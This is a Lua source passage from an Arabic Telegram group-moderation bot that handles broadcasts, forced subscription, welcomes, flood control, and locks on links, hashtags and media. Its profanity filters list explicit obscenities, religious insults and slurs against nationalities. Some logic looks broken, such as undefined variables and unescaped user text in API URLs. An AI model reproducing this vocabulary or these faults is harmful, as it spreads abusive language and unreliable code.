if database:get(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ♤' then   
send(msg.chat_id_, msg.id_," ♤ تم الغاء الاذاعه")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'Chek:Groups')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_," ♤ تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ♤' then   
send(msg.chat_id_, msg.id_," ♤ تم الغاء الاذاعه")
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'User_Bot')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_," ♤ تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, " ♤ تم الغاء الامر ")
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local username = string.match(text, "@[%a%d_]+") 
tdcli_function ({    
ID = "SearchPublicChat",    
username_ = username  
},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, ' ♤ المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, ' ♤ عذا لا يمكنك وضع معرف حسابات في الاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,' ♤ عذا لا يمكنك وضع معرف كروب بالاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,' ♤ البوت ادمن في القناة \n ♤ تم تفعيل الاشتراك الاجباري في \n ♤ ايدي القناة ('..data.id_..')\n ♤ معرف القناة ([@'..data.type_.channel_.username_..'])')
database:set(bot_id..'add:ch:id',data.id_)
database:set(bot_id..'add:ch:username','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,' ♤ عذرآ البوت ليس ادمن بالقناه ')
end
return false  
end
end,nil)
end
if database:get(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, " ♤ تم الغاء الامر ")
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
database:set(bot_id..'text:ch:user',texxt)
send(msg.chat_id_, msg.id_,' ♤ تم تغيير رسالة الاشتراك ')
end

local status_welcome = database:get(bot_id..'Chek:Welcome'..msg.chat_id_)
if status_welcome and not database:get(bot_id..'lock:tagservr'..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
t = GetWelcomeGroup
else  
t = '\n• نورت حبي \n•  name \n• user' 
end 
t = t:gsub('name',result.first_name_) 
t = t:gsub('user',('@'..result.username_ or 'لا يوجد')) 
send(msg.chat_id_, msg.id_,'['..t..']')
end,nil) 
end 
end 

if msg.content_.ID == "MessageChatAddMembers" then 
if msg.content_.members_[0].id_ == tonumber(bot_id) then 
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "الملوك")
tdcli_function ({ID = "GetUser",user_id_ = bot_id,},function(arg,data) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = bot_id,offset_ = 0,limit_ = 1},function(extra,result,success) 
if result.photos_[0] then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
},
{
{text = 'أضفہ ألبہوتہ أليہ مہجہمہوعہتہكہ°', url = "https://t.me/"..data.username_.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
local Texti = "٭ مرحبا انا بوت "..N.." \n↞ اختصاصي ادارة المجموعات من السبام والخ..\n↞ للتفعيل ارفعني مشرف وارسل تفعيل في المجموعه ."
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Texti)..'&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end,nil)
end,nil)
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.photo_ then  
if database:get(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then  
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,' ♤ عذرآ البوت ليس ادمن بالقناه ')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,' ♤ … عذرآ البوت لايملك صلاحيات')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,' ♤ تم تغيير صورة الجروب')
end
end, nil) 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
end   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ♤ تم الغاء وضع الوصف")
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
send(msg.chat_id_, msg.id_,' ♤ تم تغيير وصف الجروب')
return false  
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ♤ تم الغاء حفظ الترحيب")
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id..'Get:Welcome:Group'..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,' ♤ تم حفظ ترحيب الجروب')
return false   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == 'الغاء' then
send(msg.chat_id_,msg.id_," ♤ تم الغاء حفظ الرابط")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)")   
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_," ♤ تم حفظ الرابط بنجاح")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
--------------------------------------------------------------------------------------------------------------
if DRAGON_Msg and not Special(msg) then  
local DRAGON_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if DRAGON_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ♤ الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ♤ ["..DRAGON_Msg.."] \n")
else
send(msg.chat_id_,0," ♤ الـعـضو  : {["..data.first_name_.."](T.ME/eLmLoK0)}\n ♤ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
--------------------------------------------------------------------------------------------------------------
if not Special(msg) and msg.content_.ID ~= "MessageChatAddMembers" and database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") then 
floods = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") or 'nil'
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 5
local post_count = tonumber(database:get(bot_id..'floodc:♤'..msg.sender_user_id_..'♤:'..msg.chat_id_) or 0)
if post_count > tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5) then 
local ch = msg.chat_id_
local type = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") 
trigger_anti_spam(msg,type)  
end
database:setex(bot_id..'floodc:♤'..msg.sender_user_id_..'♤:'..msg.chat_id_, tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 3), post_count+1) 
local edit_id = data.text_ or 'nil'  
NUM_MSG_MAX = 5
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") then
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") 
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") then
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") 
end 
end 
--------------------------------------------------------------------------------------------------------------
if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Special(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Fars'..msg.chat_id_) and not Special(msg) then 
list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن", "خالی بند","عزیزم خوبی","سلامت باشی","میخوام","سلام","خوببی","ميدم","کی اومدی","خوابیدین"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Engilsh'..msg.chat_id_) and not Special(msg) then 
list = {'a','u','y','l','t','b','A','Q','U','J','K','L','B','D','L','V','Z','k','n','c','r','q','o','z','I','j','m','M','w','d','h','e'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Special(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك","كسمك","يا ابن الخول","المتناك","شرموط","شرموطه","ابن الشرموطه","ابن الخول","ابن العرص","منايك","متناك","احا","ابن المتناكه","زبك","عرص","زبي","خول","لبوه","لباوي","ابن اللبوه","منيوك","كسمكك","متناكه","احو","احي","يا عرص","يا خول","قحبه","القحبه","شراميط","العلق","العلوق","العلقه","كسمك","يا ابن الخول","المتناك","شرموط","شرموطه","ابن الشرموطه","ابن الخول","االمنيوك","كسمككك","الشرموطه","ابن العرث","ابن الحيضانه","زبك","خول","زبي","قاحب"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Fars'..msg.chat_id_) and not Special(msg) then 
list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك","كسمك","يا ابن الخول","المتناك","شرموط","شرموطه","ابن الشرموطه","ابن الخول","ابن العرص","منايك","متناك","احا","ابن المتناكه","زبك","عرص","زبي","خول","لبوه","لباوي","ابن اللبوه","منيوك","كسمكك","متناكه","احو","احي","يا عرص","يا خول","قحبه","القحبه","شراميط","العلق","العلوق","العلقه","كسمك","يا ابن الخول","المتناك","شرموط","شرموطه","ابن الشرموطه","ابن الخول","االمنيوك","كسمككك","الشرموطه","ابن العرث","ابن الحيضانه","زبك","خول","زبي","قاحب"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن","اصل","پ","پی","لطفا","سکوت","نیومدم","گم","كس","كحبه","تبادل","جهات","سني","شيعي","ياسعودي","ياعراكي","كسمك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"ربج","خرب دينك","خرب دينج","عير بربك","جهات","كس ربك","رب الكواد","كسم ربك","خرب دينك","خرب دينج","عير بربك","سكسي","كس ربك","خرب الله","صوج الله","خرب محمد","الله الكواد","صوج الله","كسخت الله","ربك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"زيج","عفطه","نيجه","مصه","لحسه","العبي","ابن التنيج","ارد اتنايج","خره بالعراق","انعل رب العراق","كسربك","كسج","كسي","تنيج","69","عير","كيري","مبعوص","كسختك","بعبصتكم","موشريفه","ابن","صرم","اختك","خالتك","امك","رب الكواد","xnxx","كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"يا عبد","يا سعودي","يا عراقي","يا عراكي","يا سوري","يا فلسطيني","يا اردني","يا مصري","يا خليجي","يا محتل","يا مشرد","يا فقير","يبن فقيره","يا مهان","يا ابيض","يا نظيف","يعبد","يسعودي","يعراقي","يعاركي","يمصري","يردني","يمشرد","يفقير","يفلسطيني","يابيض","يا هطف","يبن هبله","يحمار","ياهبل","يخليجي"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id..'lock:text'..msg.chat_id_) and not Special(msg) then       
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false     
end     
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
database:incr(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Special(msg) then   
if database:get(bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
chat_kick(msg.chat_id_,mem_id[i].id_)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and not Special(msg) then 
if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
chat_kick(msg.chat_id_,msg.sender_user_id_)
return false  
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if not Special(msg) then 
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" and not Special(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" and not Special(msg) then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Special(msg) then     
if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageVideo' and not Special(msg) then     
if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Special(msg) then     
if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.game_ and not Special(msg) then     
if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then
